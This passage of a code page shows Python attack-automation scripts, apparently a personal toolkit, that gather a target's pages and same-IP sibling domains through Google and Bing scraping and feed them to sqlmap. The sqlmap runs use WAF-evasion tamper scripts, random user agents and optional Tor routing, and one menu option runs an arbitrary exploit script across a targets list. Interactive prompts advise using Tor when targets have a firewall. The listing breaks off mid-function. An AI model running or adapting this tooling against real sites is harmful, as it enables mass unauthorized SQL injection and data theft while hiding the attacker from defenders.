			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">fp</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">origin_https_url_or_file</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">all_urls</span><span class="o">=</span><span class="n">fp</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
		<span class="n">fp</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
		<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">all_urls</span><span class="p">:</span>
			<span class="n">origin_https_url</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(\s)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>		
			<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
			<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
			<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
			<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
			<span class="c1">#print("sqlmap_string is %s" % sqlmap_string)
</span>			<span class="k">if</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="n">https_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">):</span>
	<span class="c1">#this function use myGoogleScraper to search google dork to get the full
</span>	<span class="c1">#urls,in this mode,we need input the yanchengma by human,not robot,coz 
</span>	<span class="c1">#sqlmap's -g option can only get the former 100 results,this function will
</span>	<span class="c1">#get almost the all results.
</span>	<span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)|(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">):</span>
		<span class="n">domain_url</span><span class="o">=</span><span class="n">https_url_or_file</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span> <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">url_or_file</span><span class="p">)</span> <span class="k">else</span> <span class="n">https_url_or_file</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
		<span class="n">query</span><span class="o">=</span><span class="sh">'''</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">'''</span> <span class="o">%</span> <span class="n">domain_url</span>
		<span class="c1">#import easy_search
</span>		<span class="c1">#search_url_list=blew expression
</span>		<span class="c1">#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_https_domain_url_list")
</span>		<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">/root/myenv/bin/python3.5 easy_search.py </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'''</span> <span class="o">%</span> <span class="n">query</span><span class="p">)</span><span class="c1">#here myenv/python3.5 is the selenium changed version
</span>		<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span>
		<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span>
		<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span>
		<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span>
		<span class="c1">#print("sqlmap_string is:%s" % sqlmap_string)
</span>		<span class="k">if</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="c1">#print(666666661111111)
</span>		<span class="k">try</span><span class="p">:</span>
			<span class="n">fp</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">https_url_or_file</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
			<span class="n">all_urls</span><span class="o">=</span><span class="n">fp</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
			<span class="c1">#print("open file 666666")
</span>			<span class="nf">print</span><span class="p">(</span><span class="mi">55555</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="n">all_urls</span><span class="p">)</span>
			<span class="n">fp</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
			<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">all_urls</span><span class="p">:</span>
				<span class="n">domain_url</span><span class="o">=</span><span class="n">each</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span> <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">each</span><span class="p">)</span> <span class="k">else</span> <span class="n">each</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
				<span class="nf">print</span><span class="p">(</span><span class="mi">6666</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="n">domain_url</span><span class="p">)</span>
				<span class="n">query</span><span class="o">=</span><span class="sh">'''</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">'''</span> <span class="o">%</span> <span class="n">domain_url</span>
				<span class="c1">#import easy_search
</span>				<span class="c1">#search_url_list=blew expression
</span>				<span class="c1">#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_https_domain_url_list")
</span>				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">/root/myenv/bin/python3.5 easy_search.py </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'''</span> <span class="o">%</span> <span class="n">query</span><span class="p">)</span><span class="c1">#here myenv/python3.5 is the selenium changed version
</span>			<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span>
			<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span>
			<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span>
			<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span>
			<span class="c1">#print("sqlmap_string is:%s" % sqlmap_string)
</span>			<span class="k">if</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
		<span class="k">except</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">open file error</span><span class="sh">"</span><span class="p">)</span>
		

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="nf">sqlmap_g_human</span><span class="p">(</span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="p">,</span><span class="bp">False</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="nf">main</span><span class="p">()</span>
</code></pre></div></div>

<p>5&gt;MyToolKit.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#works in py3,coz mysqlmap module need py3
#works in py2 with selenium not changed best,coz
#the mysqlmap module will use os.system function 
#to use the selenium changed version itself
#so here with py3 while selenium changed version or
#selenium not changed version is both ok.
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#works in py3,coz mysqlmap module need py3
#works in py2 with selenium not changed best,coz
#the mysqlmap module will use os.system function 
#to use the selenium changed version itself
#so here with py3 while selenium changed version or
#selenium not changed version is both ok.
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
</span><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">re</span> 
<span class="kn">import</span> <span class="n">mysqlmap</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="c1">#该函数功能:检测当前系统vpn是否开启
</span><span class="k">def</span> <span class="nf">checkvpn</span><span class="p">():</span>
    <span class="kn">import</span> <span class="n">os</span>
    <span class="kn">import</span> <span class="n">re</span>
    <span class="c1">#windows:-n 2
</span>    <span class="c1">#linux:-c 2
</span>    <span class="n">a</span><span class="o">=</span><span class="sh">'</span><span class="s">ping www.google.com.hk -c 2</span><span class="sh">'</span>
    <span class="n">r</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">output</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
    <span class="c1">#print output
</span>    <span class="n">output</span><span class="o">=</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
    <span class="n">p</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">ttl=</span><span class="sh">'</span><span class="p">,</span><span class="n">re</span><span class="p">.</span><span class="n">I</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">p</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="n">output</span><span class="p">):</span>
        <span class="c1">#print "ok"
</span>        <span class="k">return</span> <span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>



<span class="nf">while</span><span class="p">(</span><span class="bp">True</span><span class="p">):</span>	
	<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">do you want use </span><span class="sh">'</span><span class="s">tor</span><span class="sh">'</span><span class="s"> service in your sqli action? sometimes when your network is not very well,
is not a good idea to use tor,but when your targets has waf,use tor is better.
input Y(y) or N(n) default [Y]:&gt;</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
	<span class="n">choose_tor</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
	<span class="k">if</span> <span class="n">choose_tor</span><span class="o">==</span><span class="sh">'</span><span class="s">N</span><span class="sh">'</span> <span class="ow">or</span> <span class="n">choose_tor</span><span class="o">==</span><span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
		<span class="n">bool_tor</span><span class="o">=</span><span class="bp">False</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">bool_tor</span><span class="o">=</span><span class="bp">True</span>


	<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">do you want use </span><span class="sh">'</span><span class="s">post</span><span class="sh">'</span><span class="s"> request in your sqli scan? sometimes when you want a faster speed,
use </span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="s"> request is enough,do no need to use </span><span class="sh">'</span><span class="s">post</span><span class="sh">'</span><span class="s"> request,meanwhile,when there exists some waf,
use </span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="s"> and </span><span class="sh">'</span><span class="s">post</span><span class="sh">'</span><span class="s"> will try too many times</span><span class="sh">'</span><span class="s">s request which will make the waf block you ip,so in these cases,do not use </span><span class="sh">'</span><span class="s">post</span><span class="sh">'</span><span class="s"> request,
but use only </span><span class="sh">'</span><span class="s">get</span><span class="sh">'</span><span class="s"> request without </span><span class="sh">'</span><span class="s">post</span><span class="sh">'</span><span class="s"> request,the number of sqli points will be less in the common sense,
input Y(y) or N(n) default [N]:&gt;</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
	<span class="n">choose_post</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
	
	<span class="k">if</span> <span class="n">choose_post</span><span class="o">==</span><span class="sh">'</span><span class="s">Y</span><span class="sh">'</span> <span class="ow">or</span> <span class="n">choose_post</span><span class="o">==</span><span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">:</span>
		<span class="n">post_or_not</span><span class="o">=</span><span class="bp">True</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">post_or_not</span><span class="o">=</span><span class="bp">False</span>
		
	<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">mv -f /root/.sqlmap/output/* /root/.sqlmap/output_bak</span><span class="sh">'''</span><span class="p">)</span>

	<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">there are several functions blew,chose the number of the list you want the script to do:
1.for exp execution to the targets,your targets file should include the urls like </span><span class="sh">"</span><span class="s">https://xxx.xxx.xxx/xx/</span><span class="sh">"</span><span class="s"> or </span><span class="sh">"</span><span class="s">https://xxx.xxx.xxx/ etc.</span><span class="sh">"</span><span class="s">
2.for sqli by mygoogle to search the domains in one ip
3.for sqli by mybing to search the domains in one ip
4.for sqli by google search&lt;that is more than easy_search.py</span><span class="sh">'</span><span class="s">s function,but like </span><span class="sh">"</span><span class="s">easy_search.py | sqlmap -m</span><span class="sh">"</span><span class="s">&gt;
5.sqli scan only url in targets.txt,without the urls</span><span class="sh">'</span><span class="s">s side domains(只扫targets.txt中的url,不扫旁站)
input your number here:&gt;</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
	<span class="n">num</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">())</span>
	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">input your exp path here:&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">exp_path</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">input your targets path here:&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">targets</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
		<span class="n">fp</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">targets</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>		
		<span class="nb">list</span><span class="o">=</span><span class="n">fp</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
		<span class="n">fp</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
		<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">python %s &gt;&gt; </span><span class="sh">"</span><span class="s">out_log.txt</span><span class="sh">"'''</span> <span class="o">%</span> <span class="n">exp_path</span><span class="p">)</span>
		<span class="k">pass</span>



	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">input your targets path here,the name has to be </span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="s">,
if your target file is not </span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="s">,you</span><span class="sh">'</span><span class="s">d better change its file name to </span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="s">,
otherwise you need to change the source code :&gt;</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">targets</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">there are three kinds of sqli blew:
1.use </span><span class="sh">"</span><span class="s">sqlmap_crawl</span><span class="sh">"</span><span class="s"> 
2.use </span><span class="sh">"</span><span class="s">sqlmap-g-nohuman</span><span class="sh">"</span><span class="s">
3.use </span><span class="sh">"</span><span class="s">sqlmap-g-human
input your number here:</span><span class="sh">'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
		<span class="n">num</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">())</span>
		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
					<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_craw</span><span class="p">(</span><span class="sh">"</span><span class="s">GoogleScraper_bing_origin_https_domain_url_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
					<span class="k">try</span><span class="p">:</span>
						<span class="n">mysqlmap</span><span class="p">.</span><span class="nf">sqlmap_craw</span><span class="p">(</span><span class="sh">"</span><span class="s">bing_origin_https_domain_url_list.txt</span><span class="sh">"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
					<span class="k">except</span><span class="p">:</span>
						<span class="k">pass</span>
				<span class="k">else</span><span class="p">:</span>
					<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
					<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">vpn is off,scan will continue till vpn is on</span><span class="sh">"</span><span class="p">)</span>



		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
			<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
				<span class="k">if</span> <span class="nf">checkvpn</span><span class="p">():</span>
